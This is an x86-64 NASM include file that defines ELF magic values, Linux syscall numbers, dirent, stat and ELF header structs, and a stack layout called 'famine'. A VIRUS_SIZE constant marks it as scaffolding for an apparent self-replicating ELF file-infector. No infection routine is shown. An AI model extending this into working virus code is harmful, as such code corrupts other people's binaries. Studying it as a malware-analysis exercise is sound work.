; ELF header data for comparisons

%define	_SYSV_			0x00010102464c457f
%define	_GNU_			0x03010102464c457f
%define	_DYN_			0x00000001003e0003
%define	_EXEC_			0x00000001003e0002
%define	SEGMENT_TYPE	0x0000000500000001	

%define	_write			1
%define	_exit			60
%define	_open			2
%define	_close			3
%define	_fstat			5
%define	_mmap			9
%define	_munmap			11
%define	_getdents		78
%define	_chmod			90


; File acces
%define	O_RDONLY			0o0000000
%define	O_RDWR				0o0000002
%define	O_DIRECTORY			0o0200000
%define	PATH_MAX			4096
%define	DT_REG				8
%define DT_DIR				4

; mmap
%define	PROT_READ			0x1
%define	PROT_WRITE			0x2
%define	MAP_SHARED 			0x01
%define	MMAP_ERRORS			-4095


; Famine
%define VIRUS_SIZE			(_finish - _start)
%define STACK(x)			[(rbp - famine_size) + x]
%define	DIRENT_ARR_SIZE		1024



; MACROS
%macro PUSH 0
	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push rbp
	push rsp
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r14
	push r15
%endmacro
%macro POP 0
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rsp
	pop rbp
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax
%endmacro

;Strucs

	struc	dirent
.d_ino:			resq	1	; 64-bit inode number
.d_off:			resq	1	; 64-bit offset to next structure
.d_reclen		resw	1	; Size of this dirent
.d_name			resb	1	; Filename (null-terminated)
.pad			resb	0	;  0 PADDING 
.d_type			resb	1	; byte TYPE
	endstruc



	struc	stat
.st_dev			resq	1	; ID of device containing file
.__pad1			resw	1	; Padding
.st_ino			resq	1	; Inode number
.st_mode		resd	1	; File type and mode
.st_nlink		resq	1	; Number of hard links
.st_uid			resd	1	; User ID of owner
.st_gid			resd	1	; Group ID of owner
.st_rdev		resq	1	; Device ID (if special file)
.__pad2			resw	1	; Padding
.st_size		resq	1	; Total size, in bytes
.st_blksize		resq	1	; Block size for filesystem I/O
.st_blocks		resq	1	; Number of 512B blocks allocated
.st_atim		resq	2	; Time of last access
.st_mtim		resq	2	; Time of last modification
.st_ctim		resq	2	; Time of last status change
.__unused		resq	3	; Unused
	endstruc



; ELF headers

	struc	elf64_ehdr
.e_ident		resb	16	; Magic number and other info
.e_type			resw	1	; Object file type
.e_machine		resw	1	; Architecture
.e_version		resd	1	; Object file version
.e_entry		resq	1	; Entry point virtual address
.e_phoff		resq	1	; Program header table file offset
.e_shoff		resq	1	; Section header table file offset
.e_flags		resd	1	; Processor-specific flags
.e_ehsize		resw	1	; ELF header size in bytes
.e_phentsize	resw	1	; Program header table entry size
.e_phnum		resw	1	; Program header table entry count
.e_shentsize	resw	1	; Section header table entry size
.e_shnum		resw	1	; Section header table entry count
.e_shstrndx		resw	1	; Section header string table index
	endstruc



	struc	elf64_phdr
.p_type			resd	1	; Segment type
.p_flags		resd	1	; Segment flags
.p_offset		resq	1	; Segment file offset
.p_vaddr		resq	1	; Segment virtual address
.p_paddr		resq	1	; Segment physical address
.p_filesz		resq	1	; Segment size in file
.p_memsz		resq	1	; Segment size in memory
.p_align		resq	1	; Segment alignment
	endstruc

; Structure for our variables on stack

	struc	famine
.dirents		resb	DIRENT_ARR_SIZE	; Array of dirents
.dir_fd			resq	1				; Directory fd
.file_path		resb	PATH_MAX		; File path Buffer
.new_dir		resb	PATH_MAX
.file_fd		resq	1				; Open file fd
.stat			resb	stat_size		; Buffer for stat struct
.file_size		resq	1				; Size of open file
.file_data		resq	1				; Pointer to mmapped file data
	endstruc
